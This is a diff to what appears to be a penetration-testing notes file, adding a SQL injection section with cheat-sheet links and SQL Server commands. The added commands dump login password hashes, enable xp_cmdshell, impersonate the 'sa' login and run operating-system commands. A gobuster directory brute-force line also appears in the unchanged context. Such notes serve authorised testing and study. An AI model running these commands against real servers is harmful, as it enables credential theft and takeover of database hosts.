@@ -163,7 +163,17 @@ gobuster dir -u http://targetIp -w /usr/share/wordlists/dirb/common.txt -b
 403,404 -x .php,.xml,.txt -r
 
 #### 10.2 SQLi
+    ##### 10.2.1 CheatSheet
     https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
     https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
+
+    ##### 10.2.2 Sql Server
+        select name,password_hash from master.sys.sql_logins; -- check the database users 
+        select loginname from syslogins where sysadmin = 1; -- check the database users 
+        enable_xp_cmdshell;  -- enable command exec
+        SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' -- check if impersonation possible
+        SELECT SYSTEM_USER  -- show system user
+        EXECUTE AS LOGIN = 'sa'  -- move to the selected user        
+        EXEC xp_cmdshell whoami -- execute whoami 
 
 
